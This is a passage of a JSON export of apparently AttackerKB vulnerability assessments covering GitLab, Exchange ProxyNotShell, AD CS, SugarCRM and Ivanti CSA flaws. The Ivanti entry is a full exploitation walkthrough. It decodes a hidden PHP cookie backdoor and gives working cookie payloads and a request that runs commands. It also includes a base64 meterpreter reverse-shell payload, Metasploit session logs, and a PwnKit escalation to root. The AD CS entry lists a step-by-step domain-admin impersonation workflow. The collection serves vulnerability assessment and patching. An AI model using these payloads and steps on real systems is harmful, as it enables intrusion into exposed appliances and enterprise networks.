          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "bddf75f7-43e2-41b4-b01d-f9b21d98a02d",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "78407182-dc99-4e69-a237-1a67c1c869fa",
      "created": "2022-12-14T15:12:15.157875Z",
      "revisionDate": "2022-12-16T15:05:48.428951Z",
      "document": "Rating this as a high-value vulnerability for attackers. This does require auth to exploit, either via user credentials or a personal access token. This could either be done with stolen credentials or by creating an account if that is permitted on the target instance. Exploitation appears to be straightforward; initiate a repository import which contains the payload / RESP message and get a shell. The only caveat here is that the repository needs to be publicly available to the Gitlab instance.\r\n\r\nThe Hackerone [report](https://hackerone.com/reports/1679624) goes into more detail on how the RESP message actually gets executed. This one is important to patch.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "16f790d2-abe4-49e4-b5da-b9eb0ba9900e",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "06902ea5-c8b6-49e9-9cef-3a8c7df04b4a",
      "created": "2022-12-29T23:52:10.455474Z",
      "revisionDate": "2022-12-29T23:52:10.454473Z",
      "document": "Evidently this is [being used for privilege escalation in ransomware attacks](https://community.riskiq.com/article/6dc6f62a) when threat actors have initial access to systems through existing Raspberry Robin, FAKEUPDATES, and/or Qakbot infections. Not necessarily surprising given the Windows print spooler's popularity with attackers, but the [existing intel](https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/) on [Raspberry Robin](https://redcanary.com/blog/raspberry-robin/) and Qbot ecosystems is a little light on specific CVE mentions. I was surprised to see the [RiskIQ article](https://community.riskiq.com/article/6dc6f62a), especially considering that it's fairly buried in run-of-the-mill Patch Tuesday roundup drivel in Google search results.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "d200fb32-b92f-4f69-8ae1-f6e253cf00c2",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "c3392d0b-be07-425d-9678-3c919b2dfa7f",
      "created": "2023-01-08T09:32:05.922297Z",
      "revisionDate": "2023-01-14T19:53:32.936832Z",
      "document": "During the boring Christmas Days,  -- those days where you have to sit together, be nice to each other and eat and drink too much --, I stumbled upon this RCE where surprisingly not much was published on the analysis of this vulnerability.\r\nIt was discovered in December 2021 by the security researcher `Jakub Kramarz` and is affecting the `Ivanti Cloud Services Appliance for Avanti Endpoint Manager` versions before `4.6.0-512`.\r\nIt allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).\r\n\r\nif you read the security advisory,  [Ivanti Security Advisory 2021-12-02](https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US), it mentions that the vulnerable code is located in the `/opt/landesk/broker/webroot/lib/csrf-magic.php` and the target endpoint is `/client/index.php`.\r\n\r\n> To mitigate the issue, make a backup of the file and manually edit as follows: Remove the ten lines near the end of the file that start with \u201c// Obscure Tokens\u201d > but leave in the last 6 lines of code which follow which is the section that starts with \u201c// Load user configuration\u201d.\r\n\r\nAfter some research on the Internet, i managed to lay my hands on a vulnerable virtual appliance and installed it in `Virtualbox`.\r\nAfter searching in the file  `/opt/landesk/broker/webroot/lib/csrf-magic.php`, I indeed found the vulnerable code mentioned in the security advisory (see code snippet below)\r\n```php\r\n// Obscure Tokens\r\n$aeym=\"RlKHfsByZWdfcmVwfsbGFjZShhcnJheSgnLfs1teXHc9fsXHNdLyfscsJy9fsccy8nfsKSwgYXJyfsYXkoJycsfsJysn\";\r\n$lviw = str_replace(\"m\",\"\",\"msmtmr_mrmemplmamcme\");\r\n$bbhj=\"JGMofsJGEpPjMpefsyRrPSdjMTIzJzfstlfsY2hvICc8Jy4kay4nPic7ZXfsZfshbChiYXNlNjRfZGVjb2\";\r\n$hpbk=\"fsJGfsM9fsJ2NvdW50fsJzfsskYfsT0kXfs0NPT0tJRTtpZihyfsZfsXNldfsCgfskYfsSkfs9fsPSdhYicgJiYg\";\r\n$rvom=\"KSwgam9pbihhcnfsJheV9zbGljZSgkYSwkYyfsgkYSktMyfskpfsKSkpOfs2VjaG8gJzwvJy4fskay4nPic7fQ==\";\r\n$xytu = $lviw(\"oc\", \"\", \"ocbocaocseoc6oc4_ocdoceoccocoocdoce\");\r\n$murp = $lviw(\"k\",\"\",\"kckrkeaktkek_kfkunkcktkikokn\");\r\n$zmto = $murp('', $xytu($lviw(\"fs\", \"\", $hpbk.$bbhj.$aeym.$rvom))); $zmto();\r\n```\r\nInteresting, right? Because it clearly looks like some hidden code...\r\nIf you just copy this in a php file and run it you will soon understand that it dynamically generates a function that enables a cookie based RCE.\r\nNote: `create_function()` is deprecated in PHP 8 and above\r\n```php\r\n<?php\r\n// Obscure Tokens\r\n$aeym=\"RlKHfsByZWdfcmVwfsbGFjZShhcnJheSgnLfs1teXHc9fsXHNdLyfscsJy9fsccy8nfsKSwgYXJyfsYXkoJycsfsJysn\";\r\n$lviw = str_replace(\"m\",\"\",\"msmtmr_mrmemplmamcme\");\r\n$bbhj=\"JGMofsJGEpPjMpefsyRrPSdjMTIzJzfstlfsY2hvICc8Jy4kay4nPic7ZXfsZfshbChiYXNlNjRfZGVjb2\";\r\n$hpbk=\"fsJGfsM9fsJ2NvdW50fsJzfsskYfsT0kXfs0NPT0tJRTtpZihyfsZfsXNldfsCgfskYfsSkfs9fsPSdhYicgJiYg\";\r\n$rvom=\"KSwgam9pbihhcnfsJheV9zbGljZSgkYSwkYyfsgkYSktMyfskpfsKSkpOfs2VjaG8gJzwvJy4fskay4nPic7fQ==\";\r\n$xytu = $lviw(\"oc\", \"\", \"ocbocaocseoc6oc4_ocdoceoccocoocdoce\");\r\n$murp = $lviw(\"k\",\"\",\"kckrkeaktkek_kfkunkcktkikokn\");\r\n$zmto = $murp('', $xytu($lviw(\"fs\", \"\", $hpbk.$bbhj.$aeym.$rvom)));  // $zmto();\r\n\r\n$hvg= $xytu($lviw(\"fs\", \"\", $hpbk.$bbhj.$aeym.$rvom));\r\necho \"$lviw\\n\";\r\necho \"$xytu\\n\";\r\necho \"$murp\\n\";\r\necho \"$hvg\\n\";\r\necho \"$zmto\\n\";\r\n```\r\n **Output**\r\n```console\r\nstr_replace\r\nbase64_decode\r\ncreate_function\r\n$c='count';$a=$_COOKIE;if(reset($a)=='ab' && $c($a)>3){$k='c123';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\\w=\\s]/','/\\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}\r\nlambda_1\r\n```\r\nThe code line `$c='count';$a=$_COOKIE;if(reset($a)=='ab' && $c($a)>3){$k='c123';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\\w=\\s]/','/\\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}` is the one with the logic.\r\n\r\nIt uses the `$_COOKIE` as the input and it checks the count of the cookie pairs which should be more then 3 and the first cookie pair value should be `ab`. If these conditions match it will use the cookie pair value matching the count - 3 containing base64 PHP code , sanitizes the base64 code (remove whitespace etc) and decodes it for execution in the `eval` function which natively executes PHP code. The result of the command execution can be found in the HTTP response between the tags `<c123></c123>`.\r\n\r\nSome examples of Cookie headers that will work:\r\nExample 1 (count =4) -> payload at 2nd pair:  `Cookie: hello=ab; exec=<base64 php payload>; cuckoo=; clock=;`\r\nExample 2 (count =5) -> payload at 3th pair:  `Cookie: thisisnice=ab; skipthisone=; executethisone=<base64 php payload>; b=; c=;`\r\nExample 3 (count =6) -> payload at 4th pair:  `Cookie: thisisnice=ab; skipthisone=; alsoskipthisone=; executethisone=<base64 php payload>; b=; c=;`\r\n\r\nPayload should be native PHP code and `base64` encoded.\r\n\r\nThe most interesting question however is, why this is added to the code? It is a left-over from testing or more likely, a backdoor to get access to the appliances? \r\nI do know the answer, but if you check with `Shodan`,  you will still find more then **2000** of these appliances connected to the Internet from which around **15%** still runs this vulnerable version.\r\n\r\nLet's play a bit with Burpsuite to see if the logic works...\r\n\r\n**Example one - system(\"id\");**\r\n```\r\nGET /client/index.php HTTP/1.1\r\nHost: 192.168.100.41\r\nCookie: thisisnice=ab; skipthisone=; executethisone=c3lzdGVtKCJpZCIpOw==; b=; c=;\r\nUser-Agent: curl/7.86.0\r\nAccept: */*\r\nConnection: close\r\n\r\n```\r\n**Output**\r\n```html\r\nHTTP/1.1 200 OK\r\nSet-Cookie:LDCSASESSID=ttki9kounanus8fqm19juo3am6; path=/; secure; HttpOnly\r\nExpires:Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma:no-cache\r\nX-Frame-Options:sameorigin\r\nX-Content-Type-Options:nosniff\r\nStrict-Transport-Security:max-age=31536000; includeSubDomains;  preload\r\nX-XSS-Protection:1; mode=block\r\nReferrer-Policy:no-referrer\r\nContent-type:text/html\r\nContent-Length:7161\r\nDate:Sun, 08 Jan 2023 05:29:50 GMT\r\n\r\n<c123>uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0\r\n</c123>\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\r\n<html>\r\n<head>\r\n<title>Ivanti&reg; Cloud Services Appliance\r\netc....\r\n```\r\n**Example two - php meterpreter**\r\n```console\r\n# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.41 LPORT=4444 -f raw | base64\r\n```\r\nSetup a multi/handler with payload php/meterpreter/reverse_tcp \r\n\r\n**Burp request**\r\n```\r\nGET /client/index.php HTTP/1.1\r\nHost: 192.168.100.41\r\nCookie: thisisnice=ab; skipthisone=; alsoskipthisone=; executethisone=Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMTAwLjcnOyAkcG9ydCA9IDQ0NDQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw==; b=; c=;\r\nUser-Agent: curl/7.86.0\r\nAccept: */*\r\nConnection: close\r\n```\r\n**Metasploit**\r\n```console\r\nmsf6 exploit(multi/handler) > exploit -j -z\r\n[*] Exploit running as background job 0.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444\r\nmsf6 exploit(multi/handler) > [*] Sending stage (39927 bytes) to 192.168.100.41\r\n[*] Meterpreter session 1 opened (192.168.100.7:4444 -> 192.168.100.41:59422) at 2023-01-08 10:00:10 +0000\r\n\r\nmsf6 exploit(multi/handler) > sessions -i 1\r\n[*] Starting interaction with 1...\r\n\r\nmeterpreter > sysinfo\r\nComputer    : localhost.localdomain\r\nOS          : Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64\r\nMeterpreter : php/linux\r\nmeterpreter > getuid\r\nServer username: nobody\r\nmeterpreter >\r\n```\r\nThe appliance has a rich set of tooling such as `python`, `netcat`, `bash`, `perl` and others installed so the attack surface is pretty broad.\r\nOne point of attention however is that the attack surface for the appliances running in the wild might be restricted because of the hardening. For instance, most of the appliances only allow in and outbound traffic on port 80 and 443 (see [Hardening CSA appliance](https://forums.ivanti.com/s/article/How-to-harden-the-CSA-4-3-4-4?language=en_US)).\r\n\r\n### Additional privilege escalation\r\nIf you have established a foothold on the appliance, you can get to `root` because the underlying CentOS is vulnerable to [CVE-2021-4034](https://attackerkb.com/topics/JGooJTBk81/cve-2021-4034).\r\n```console\r\nmsf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options\r\n\r\nModule options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):\r\n\r\n   Name          Current Setting  Required  Description\r\n   ----          ---------------  --------  -----------\r\n   PKEXEC_PATH                    no        The path to pkexec binary\r\n   SESSION       1                yes       The session to run this module on\r\n   WRITABLE_DIR  /tmp             yes       A directory where we can write files\r\n\r\n\r\nPayload options (linux/x64/meterpreter/reverse_tcp):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST  192.168.100.7    yes       The listen address (an interface may be specified)\r\n   LPORT  5555             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   x86_64\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.100.7:5555\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[!] Verify cleanup of /tmp/.zcbstvgmiy\r\n[+] The target is vulnerable.\r\n[*] Writing '/tmp/.shmkphpno/qwsfmu/qwsfmu.so' (548 bytes) ...\r\n[!] Verify cleanup of /tmp/.shmkphpno\r\n[*] Sending stage (3045348 bytes) to 192.168.100.41\r\n[+] Deleted /tmp/.shmkphpno/qwsfmu/qwsfmu.so\r\n[+] Deleted /tmp/.shmkphpno/.xlfjhsej\r\n[+] Deleted /tmp/.shmkphpno\r\n[*] Meterpreter session 2 opened (192.168.100.7:5555 -> 192.168.100.41:43842) at 2023-01-08 10:25:05 +0000\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter >\r\n```\r\nI have created a  Metasploit module that has been submitted to the mainstream for production.  A local version of this module can found at the **References** section.\r\n\r\n## Mitigation\r\nFollow the guidance in security advisory [Ivanti Security Advisory 2021-12-02](https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US).\r\n\r\n## References\r\n[Ivanti Security Advisory 2021-12-02](https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US)\r\n[Packetstorm](https://packetstormsecurity.com/files/166383/Ivanti-Endpoint-Manager-CSA-4.5-4.6-Remote-Code-Execution.html)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)\r\n\r\n### Credits\r\nCredits goes to the security researchers below who discovered and analyzed this vulnerability.\r\n* [Jakub Kramarz](https://twitter.com/lenwenet)\r\n* [William Wallace](https://twitter.com/phyr3wall)\r\n* [d7x](https://twitter.com/d7x_real)\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7f4c08b3-2987-4173-ad05-76b602b053d7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "b18222fb-1ef5-4d55-899b-61bd7ecf0faa",
      "created": "2023-01-10T14:58:25.234249Z",
      "revisionDate": "2023-01-10T15:46:59.163666Z",
      "document": "CVE-2022-41082, also known as ProxyNotShell is an authenticated RCE in Microsoft Exchange. ProxyNotShell actually combines CVE-2022-41082 and CVE-2022-41040 for the whole attack chain. This CVE specifically however is the RCE component. The vulnerability is a deserialization flaw in Microsoft Exchange's PSRP backend. The PSRP backend can be accessed by an authenticated attacker leveraging the SSRF flaw identified as CVE-2022-41040. The deserialization gadget was documented by ZDI in their [blog](https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend). While this vulnerability affected Exchange Server 2013 and Exchange Server 2016, the gadget chain only worked with Exchange Server 2019 (version 15.2+). A new gadget chain could potentially be developed to exploit these older versions.\r\n\r\nGTSC originally announced on September 28th that they had seen a new (at the time) 0-day attack against their customers using Microsoft Exchange. On November 8th, Microsoft released patches for the two vulnerabilities. Between September 28th and November, no public exploits combined the SSRF with the RCE. Private threat actors however were attempting to exploit the vulnerability which led Microsoft to issue Exchange Emergency Mitigation Service (EEMS) mitigations. These mitigations took the form of IIS rewrite rules which were able to be bypassed using encoding techniques. The last issued EEMS mitigation was able to be successfully bypassed by using IBM037v1 encoding, which can be demonstrated using the [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17275).\r\n\r\nSuccessful code execution results in OS commands running as NT AUTHORITY\\SYSTEM. The exploit is reliable to exploit and pretty quick (compared to ProxyShell which needed to gather a lot of information).",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "536bceeb-9ad1-4b2a-a593-a90848621d0f",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "e3b1ad3f-4944-421b-bf38-eb340f02151f",
      "created": "2023-01-10T15:08:10.682989Z",
      "revisionDate": "2023-01-10T15:10:44.131737Z",
      "document": "This vulnerability enables a low-privileged user to escalate privileges in a default Active Directory environment with the Active Directory Certificate Services (AD CS) installed. AD CS servers is Microsoft\u2019s public key infrastructure (PKI) implementation, which enables the issuing of certificates. Since AD CS is coupled with Active Directory, certificates can be used to authenticate against the KDC via the [PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b) Kerberos extension. The identity of a domain computer account is provided by the DNS name in the certificate.\r\n\r\nThe owner of a computer account has write permission on the computer `dNSHostName` property. As a result, it is possible to set it to any existing DNS host name in the domain, which will be the DNS host name in the issued certificate. This certificate can then be used to authenticate against the KDC.\r\n\r\nIn order to achieve privilege escalation, the DNS host name is set to a valid Domain Controller (DC) host name, resulting in a successful authentication as the DC account. Being able to authenticate as the DC account gives enough privileges to impersonate a Domain Administrator.\r\n\r\nHere is a common exploitation workflow:\r\n1. Using a low-privileged domain account, create a new computer account in the Active Directory. Note that any domain user is allowed to do so, as long as the user's `ms-DS-MachineAccountQuota` property is greater than 0 (set to 10 by default).\r\n2. Set the newly created computer `dNSHostName` attribute to match the DC DNS host name.\r\n3. Request a certificate for this computer.\r\n4. Authenticate as the DC account with this certificate.\r\n5. Request a Service Ticket (TGS) impersonating a Domain Administrator account.\r\n\r\nThis attack has been fully automated in a Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/17066) (still a WIP as time of writing). The resulting TGS can be used by any Metasploit module and external tools to impersonate a Domain Administrator.\r\n\r\nMicrosoft released a patch on May 10, 2022.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "dbfebfbc-f095-4a84-9228-cf1568425f34",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "3a0452aa-1a50-41d3-943c-085c00734c11",
      "created": "2023-01-10T15:53:22.013373Z",
      "revisionDate": "2023-02-17T22:32:36.948064Z",
      "document": "This is an alternative method for bypassing Exchange Emergency Mitigation Service (EEMS) protections for the ProxyNotShell exploit chain. When this CVE is combined with [CVE-2022-41082](https://attackerkb.com/topics/tzpl7qr8m1/cve-2022-41082), they yield code execution as NT AUTHORITY\\SYSTEM.\r\n\r\nInstalling the original patches from Microsoft that were released in November fix this exploit chain as well. The technique is arguably redundant when EEMS can be bypassed using various encoding techniques. This alternative vector is likely most valuable when used to avoid generating exploitation following the original pattern.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "2f9e745f-53d7-4e72-80ff-761f15ad56c4",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "3236e8d5-3a5f-4a70-9701-f945ae2f7b4c",
      "created": "2023-01-11T21:25:59.725843Z",
      "revisionDate": "2023-01-11T21:25:59.722661Z",
      "document": "An [exploit](https://seclists.org/fulldisclosure/2022/Dec/31) is published on the Full Disclosure mailing list, and [it's been exploited in the wild](https://censys.io/tracking-a-sugarcrm-zero-day/).\r\n\r\nAccording to [the vendor advisory](https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update), this is an authentication bypass in SugarApplication.php:\r\n\r\n> The underlying vulnerability relies on a missing authentication check in the loadUser() method in include/MVC/SugarApplication.php\r\n\r\nUnfortunately, I couldn't get ahold of a current version of the software to test. I got the [most recent community version](https://github.com/matthewpoer/SugarCRM-Community-Edition/tree/master/OldFiles/4%20-%20SugarCRM%206.2.X/SugarCommunityEdition-6.2.X) running (it's quite old), but while that file exists, the auth bypass doesn't seem to work.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "92f2db8f-5850-4edf-b44c-ba87e8712045",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "c265585c-8b7c-4471-8b30-4ae9f0349959",
      "created": "2023-01-13T14:04:22.708705Z",
      "revisionDate": "2023-04-20T14:55:31.378984Z",
